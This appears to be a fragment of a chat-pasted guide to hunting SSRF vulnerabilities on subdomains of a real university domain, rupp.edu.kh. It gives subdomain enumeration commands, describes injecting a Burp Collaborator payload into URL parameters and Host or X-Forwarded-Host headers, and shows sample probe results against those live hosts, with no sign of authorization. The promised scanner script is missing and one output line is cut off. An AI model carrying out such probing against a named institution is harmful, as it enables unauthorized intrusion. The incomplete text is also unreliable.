## 📂 Example Input File (rupp_subdomains.txt)
  ### fed.rupp.edu.kh
lib.rupp.edu.kh
mail.rupp.edu.kh
www.rupp.edu.kh
research.rupp.edu.kh
## You can generate this via:

bash
Copy
Edit
subfinder -d rupp.edu.kh > rupp_subdomains.txt
assetfinder --subs-only rupp.edu.kh >> rupp_subdomains.txt
sort -u rupp_subdomains.txt -o rupp_subdomains.txt
#### 🛡️ What This Script Does
Scans each subdomain + each path + each parameter name combination

Injects your SSRF payload (xss.burpcollaborator.net)

Sets header-based injection vectors too (Host, X-Forwarded-Host)

Logs status and response length to help filter candidates

#### ✅ Output Example
bash
Copy
Edit
[✓] https://fed.rupp.edu.kh/wp-json/oembed/1.0/embed?url=http://xss.burpcollaborator.net | 404 | Length: 73
[✓] https://lib.rupp.edu.kh/fetch?target=http://xss.burpcollaborator.net | 200 | Length: 894
[!] Error: https://mail.rupp.edu.kh/proxy?url=http://xss.burpcollaborator.net => Timeo

#### 🐍 Run the SSRF Scanner Python Script
Create the script:

Save this as ssrf_scanner.py:
#### Run python3 ssrf_scanner.py
